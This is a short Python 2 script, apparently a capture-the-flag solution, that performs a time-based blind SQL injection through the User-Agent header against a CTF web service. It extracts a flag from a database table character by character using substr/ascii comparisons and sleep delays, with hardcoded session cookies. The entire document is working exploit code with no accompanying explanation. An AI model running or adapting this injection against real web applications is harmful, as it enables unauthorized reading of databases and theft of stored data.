import requests, time, string

nama = ''
for i in range(1,100):
	cont = False
	for x in string.printable:
		a = time.time()
		injek = "' OR ((ascii(substr((select group_concat(flag) from bendera),"+ str(i) +",1))) = "+ str(ord(x)) +") AND sleep(3) ) #"
		burp0_url = "http://ctf.asgama.web.id:45001/"
		burp0_cookies = {"session": ".eJxtT82KgzAYfJXlO3vQdL0Ie1hIDRbyiSVRkptbrb-x0K5oU_ru-z3AnmaGmWGYF9SNGxZIrvX8aAO4rvO81K6FBPZ9X-r7-nsjAgEMDSQHFgew3JYL-S_4-KEU8iyU_juW4tyjOLlcNT06zZBfGIqyl9yEOZ9CrHBApZ_EIzOWUy6Kg2TlLEXqcEyd5N0nejsapb2pTr0ZTZQrQtU46btIsox0OqM4kq8364pYev20PNsM7VlV0N55kuPxINUU26rYjco2y3WIjDpef8E7gLVzkISEj_b-39H3H_yUWlw.DqtYyw.sbNFu_dRzCHC9JEu3rQAqUx_LCs", "PHPSESSID": "91639a933ac31cc8dbf7d47c429a99ca"}
		burp0_headers = {"Cache-Control": "max-age=0", "Origin": "http://ctf.asgama.web.id:45001", "Upgrade-Insecure-Requests": "1", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": injek, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "Referer": "http://ctf.asgama.web.id:45001/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
		burp0_data={"flag": "asd", "check": "1"}
		requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
		b = time.time()
		if b-a > 2:
			nama += x
			print nama
			cont = True
			break
	if not cont:
		break

print nama
